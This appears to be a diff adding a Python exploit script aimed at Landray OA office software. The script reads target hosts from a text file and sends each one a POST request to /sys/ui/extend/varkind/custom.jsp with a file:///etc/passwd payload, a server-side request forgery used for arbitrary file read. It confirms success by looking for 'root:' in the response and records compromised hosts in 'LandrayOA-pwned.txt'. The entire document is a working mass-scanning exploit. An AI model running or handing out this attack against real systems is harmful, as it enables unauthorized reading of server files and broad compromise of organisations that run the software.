@@ -1,0 +1,45 @@
+#!/usr/bin/python3
+#-*- coding:utf-8 -*-
+#author: whale3070
+
+import requests
+import re
+import json
+import sys
+
+def POC_1(target_url):
+    pwned=open("LandrayOA-pwned.txt","a")
+    vuln_url = target_url + "/sys/ui/extend/varkind/custom.jsp"
+    http_vuln_url = "http://"+vuln_url
+    https_vuln_url = "https://"+vuln_url
+    headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+                "Content-Type": "application/x-www-form-urlencoded"
+    }
+    data = 'var={"body":{"file":"file:///etc/passwd"}}'
+    try:
+        response = requests.post(url=http_vuln_url, data=data, headers=headers, verify=False, timeout=10)
+        print("\033[36m[o] 正在请求HTTP {}/sys/ui/extend/varkind/custom.jsp \033[0m".format(http_vuln_url))
+        if "root:" in response.text and response.status_code == 200:
+            print("\033[36m[o] 成功读取 /etc/passwd \n[o] 响应为:{} \033[0m".format(response.text))
+            pwned.write("http://"+target_url+"\n")
+        response2 = requests.post(url=https_vuln_url, data=data, headers=headers, verify=False, timeout=10)
+        print("\033[36m[o] 正在请求HTTPS {}/sys/ui/extend/varkind/custom.jsp \033[0m".format(https_vuln_url))
+        if "root:" in response2.text and response2.status_code == 200:
+            print("\033[36m[o] 成功读取 /etc/passwd \n[o] 响应为:{} \033[0m".format(response2.text))
+            pwned.write("https://"+target_url+"\n")
+
+    except :
+        print("请求失败")
+        pass
+    pwned.close()
+#
+if __name__ == '__main__':
+    print('+----------LandrayOA/ssrf----------+')
+    Landraydirc=open("Landray.txt","r")
+    
+    for i in Landraydirc.readlines():
+        notn=i.split("\n")
+        target_url=notn[0]
+        POC_1(target_url)
+    Landraydirc.close()
